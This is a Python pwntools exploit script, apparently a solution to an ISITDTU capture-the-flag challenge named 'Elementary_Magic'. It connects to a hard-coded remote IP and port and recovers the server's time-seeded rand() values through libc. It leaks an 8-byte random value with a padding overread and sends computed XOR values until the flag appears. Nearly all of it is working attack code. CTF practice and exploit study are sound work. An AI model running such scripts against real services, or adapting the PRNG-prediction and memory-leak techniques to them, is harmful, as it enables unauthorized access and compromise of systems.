from pwn import *
from ctypes import *
import time

context.log_level = 'critical'
context.arch = "amd64"

e = context.binary = ELF('source')
# r= e.process()
# r= remote("34.126.117.161",2000)
lib = e.libc

proc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
timefunc = proc.time
srand = proc.srand
rand = proc.rand
output = b""
result  = 0xDEADBEEFDEADC0DE
while(b"ISITDTU" not in output):

    r= remote("34.126.117.161",2000)
    
    r.recvuntil(b"================================Elementary_Magic================================\n")
    
    give = int(r.recvline(),10)
    check = timefunc(0)
    padd = give-check
    
    print("Give time: " +str(give))
    print("Check time: " +str(check))
    print("Padding: " +str(padd))

    def rand_value():
        srand(timefunc(0)+padd)
        randnum = rand()
        log.info("rand_value: %d" % randnum)
        return randnum
        
    def Time_Freeze():
        return timefunc(0)+padd

    
    srand(give)
    randnum = rand()
    print(randnum)

    r.sendafter(b"Pause time, enter to continue:",b"\x0a")

    number  = c_longlong(result^randnum^Time_Freeze())  #0xdeadbeefdeadc0de = num^rd^time1;
    log.info("Input_Number: %d" % number.value)
    #pause()
    sleep(0.5)
    r.sendlineafter(b"Shout out the magic number sequence!\n", str(number.value))
    # r.interactive()

    #pause()
    sleep(0.5)
    r.sendafter(b"Scream your advanced magic!",b"a"*30 +b"::")
    r.recvuntil(b"::")
    urand_num = u64(r.recv(8).ljust(8,b"\x00"))
    log.info("urand_num: %d" % urand_num)
    #pause()
    sleep(0.5)
    r.sendafter(b"Pause time, enter to continue:",b"\x0a")

    number  = c_longlong(result^urand_num^rand_value())  #result= (long long int)urand_num^srand_val^num;
    log.info("Input_Number: %d" % number.value)
    #pause()
    sleep(0.5)
    r.sendlineafter(b"Shout out the magic number sequence!", str(number.value))
    output = r.recvall()

print(output)
r.interactive()
